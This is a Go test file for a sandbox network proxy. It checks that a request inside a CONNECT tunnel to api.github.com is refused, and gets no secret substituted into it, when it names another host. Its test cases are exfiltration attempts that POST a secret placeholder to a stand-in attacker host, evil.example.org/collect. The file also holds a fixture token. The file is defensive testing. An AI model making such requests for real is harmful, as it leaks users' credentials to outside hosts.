package netproxy_test

import (
	"bufio"
	"context"
	"crypto/tls"
	"crypto/x509"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/SocialGouv/iterion/pkg/backend/secretguard"
	"github.com/SocialGouv/iterion/pkg/sandbox/netproxy"
)

// A request inside an inspected tunnel goes where the tunnel was opened.
// CONNECT to the host a secret is scoped to, then name another host — in the
// Host header, in an absolute URL, or with another port: the proxy refuses
// it, dials nothing and substitutes nothing; a request naming the tunnel's
// host, in any case and with or without its port, is forwarded there.
func TestARequestNamingAnotherHostThanItsTunnelIsRefused(t *testing.T) {
	const token = "ghp_R3alV4lu3Fak3T0k3nAbCdEfGhIjKlMn0p"
	g := secretguard.New([]secretguard.Secret{{Name: "gh", Value: token, Hosts: []string{"api.github.com"}}}, secretguard.DefaultConfig())
	ph := g.Secrets()[0].Placeholder
	var mu sync.Mutex
	var dialed, received, blocked []string
	upstream := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		mu.Lock()
		received = append(received, r.Host+" "+r.Header.Get("Authorization"))
		mu.Unlock()
		_, _ = w.Write([]byte("ok"))
	}))
	t.Cleanup(upstream.Close)
	addr := upstream.Listener.Addr().String()
	pool := x509.NewCertPool()
	pool.AddCert(upstream.Certificate())
	ca, err := netproxy.NewEphemeralCA()
	if err != nil {
		t.Fatal(err)
	}
	pol, err := netproxy.Compile(netproxy.ModeAllowlist, []string{"api.github.com"})
	if err != nil {
		t.Fatal(err)
	}
	prx, err := netproxy.New(netproxy.Options{Policy: pol, InspectCA: ca, Rewriter: g,
		InspectUpstreamTLS: &tls.Config{RootCAs: pool, ServerName: "example.com"},
		OnBlocked: func(host, reason string) {
			mu.Lock()
			blocked = append(blocked, host+": "+reason)
			mu.Unlock()
		},
		Dial: func(_ context.Context, network, a string) (net.Conn, error) {
			mu.Lock()
			dialed = append(dialed, a)
			mu.Unlock()
			return net.Dial(network, addr)
		}})
	if err != nil {
		t.Fatal(err)
	}
	if err := prx.Start("127.0.0.1:0"); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		ctx, cancel := context.WithTimeout(context.Background(), time.Second)
		defer cancel()
		_ = prx.Shutdown(ctx)
	})
	clientPool := x509.NewCertPool()
	clientPool.AppendCertsFromPEM(ca.CertPEM())
	// inTunnel opens a CONNECT tunnel to api.github.com:443 and sends one raw
	// request through it.
	inTunnel := func(requestLine, host string) int {
		t.Helper()
		conn, err := net.Dial("tcp", prx.Addr().String())
		if err != nil {
			t.Fatal(err)
		}
		defer conn.Close()
		_ = conn.SetDeadline(time.Now().Add(10 * time.Second))
		if _, err := conn.Write([]byte("CONNECT api.github.com:443 HTTP/1.1\r\nHost: api.github.com:443\r\n\r\n")); err != nil {
			t.Fatal(err)
		}
		br := bufio.NewReader(conn)
		if resp, err := http.ReadResponse(br, nil); err != nil || resp.StatusCode != http.StatusOK {
			t.Fatalf("CONNECT: %v %v", resp, err)
		}
		tc := tls.Client(&readerConn{Conn: conn, r: br}, &tls.Config{RootCAs: clientPool, ServerName: "api.github.com"})
		if err := tc.Handshake(); err != nil {
			t.Fatal(err)
		}
		req := requestLine + "\r\nHost: " + host + "\r\nAuthorization: Bearer " + ph + "\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
		if _, err := tc.Write([]byte(req)); err != nil {
			t.Fatal(err)
		}
		resp, err := http.ReadResponse(bufio.NewReader(tc), nil)
		if err != nil {
			t.Fatal(err)
		}
		_, _ = io.Copy(io.Discard, resp.Body)
		_ = resp.Body.Close()
		return resp.StatusCode
	}

	for _, c := range []struct{ line, host string }{
		{"POST /collect HTTP/1.1", "evil.example.org"},
		{"POST https://evil.example.org/collect HTTP/1.1", "api.github.com"},
		{"POST /collect HTTP/1.1", "api.github.com:8443"},
	} {
		if code := inTunnel(c.line, c.host); code != http.StatusMisdirectedRequest {
			t.Errorf("%s, Host %s: status %d, want 421", c.line, c.host, code)
		}
	}
	mu.Lock()
	if len(dialed) != 0 || len(received) != 0 {
		t.Errorf("a refused request reached an upstream: dialed %v, received %v", dialed, received)
	}
	if len(blocked) != 3 || !strings.Contains(blocked[0], "differs from the CONNECT target") {
		t.Errorf("network_blocked reports = %v, want one per refusal", blocked)
	}
	mu.Unlock()

	for _, host := range []string{"api.github.com", "API.GitHub.com:443"} {
		if code := inTunnel("POST /repos/o/r/dispatches HTTP/1.1", host); code != http.StatusOK {
			t.Errorf("Host %s: status %d, want 200", host, code)
		}
	}
	mu.Lock()
	defer mu.Unlock()
	if len(dialed) != 2 || dialed[0] != "api.github.com:443" || dialed[1] != "api.github.com:443" {
		t.Errorf("dialed %v, want the tunnel's target twice", dialed)
	}
	for _, r := range received {
		if !strings.HasSuffix(r, "Bearer "+token) {
			t.Errorf("the tunnel's own host did not get its secret: %q", r)
		}
	}
}

// readerConn reads through the buffered reader that consumed the CONNECT
// response, writing to the connection.
type readerConn struct {
	net.Conn
	r io.Reader
}

func (c *readerConn) Read(p []byte) (int, error) { return c.r.Read(p) }
